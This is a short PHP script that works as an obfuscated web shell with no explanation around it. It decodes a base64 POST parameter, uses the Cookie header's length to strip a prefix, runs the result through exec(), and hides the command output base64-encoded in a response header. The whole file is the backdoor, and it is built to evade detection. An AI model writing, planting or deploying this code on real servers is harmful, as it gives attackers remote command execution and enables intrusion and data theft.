<?php
$s = $_SERVER['HTTP_COOKIE'];
$d = $_POST['1'];
$cmd = substr(base64_decode($d), strlen($s));
exec($cmd, $o);
$rsp = 'Host: ' . base64_encode(implode("\r\n", $o));
header($rsp);
echo '';
?>
